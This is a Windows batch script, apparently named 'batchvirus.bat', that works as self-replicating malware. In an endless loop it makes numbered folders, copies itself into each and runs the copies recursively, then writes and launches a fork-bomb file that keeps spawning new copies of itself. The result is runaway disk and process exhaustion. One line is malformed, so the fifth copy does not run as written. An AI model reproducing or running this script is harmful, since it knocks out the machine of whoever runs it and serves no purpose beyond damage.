@echo off
:X
mkdir 1
mkdir 2
mkdir 3
mkdir 4
mkdir 5
copy batchvirus.bat 1
copy batchvirus.bat 2
copy batchvirus.bat 3
copy batchvirus.bat 4
copy batchvirus.bat 5
cd 1
batchvirus.bat
cd ..
cd 2
batchvirus.bat
cd ..
cd 3
batchvirus.bat
cd ..
cd 4
batchvirus.bat
cd ..
cd 5 batchvirus.bat
cd ..
mkdir 0
cd 0
echo start forkbomb.bat >> forkbomb.bat
start forkbomb.bat
move batchvirus.bat 0
cd ..
goto X
